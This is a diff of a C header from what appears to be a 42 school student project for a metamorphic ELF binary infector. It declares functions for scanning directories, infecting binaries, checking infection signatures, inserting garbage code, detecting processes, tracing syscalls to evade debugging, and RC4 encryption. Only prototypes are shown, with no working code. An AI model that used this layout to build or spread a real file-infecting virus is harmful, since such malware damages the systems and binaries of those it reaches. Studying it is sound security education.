@@ -6,7 +6,7 @@
 /*   By: jainavas <jainavas@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2026/01/06 22:10:30 by jainavas          #+#    #+#             */
-/*   Updated: 2026/01/09 19:41:06 by jainavas         ###   ########.fr       */
+/*   Updated: 2026/01/09 22:27:41 by jainavas         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -28,6 +28,9 @@
 # include <sys/user.h>
 # include <sys/reg.h>
 # include <signal.h>
+# include <math.h>
+
+extern long long pepino;
 
 #define SYS_CUSTOM_WRITE   6969
 #define SYS_CUSTOM_OPEN    6767
@@ -44,8 +47,9 @@ typedef struct {
     Elf64_Shdr  *shdr;       // Puntero a section headers
 } t_elf;
 
+int calculadoradepepino();
 // anti_process.c  
-bool is_process_running(const char *process_name);
+void is_process_running(const char *process_name);
 // syscall_tracer.c
 void run_with_tracer(void);
 void child_process(void);
@@ -73,10 +77,16 @@ const char      *get_signature(void);
 bool            is_infected(t_elf *elf);
 // injector.c
 void scan_and_infect(const char *dir1, const char *dir2);
+void scan_directory(const char *dir_path);
+bool is_elf_file(const char *filepath);
 int infect_binary(const char *filepath);
 // metamorph.c
 void init_metamorph(void);
 void insert_garbage(void);
+void insert_garbage5(void);
+void insert_garbage4(void);
+void insert_garbage3(void);
+void insert_garbage2(void);
 int get_execution_order(void);
 void random_delay(void);
 // rc4.c
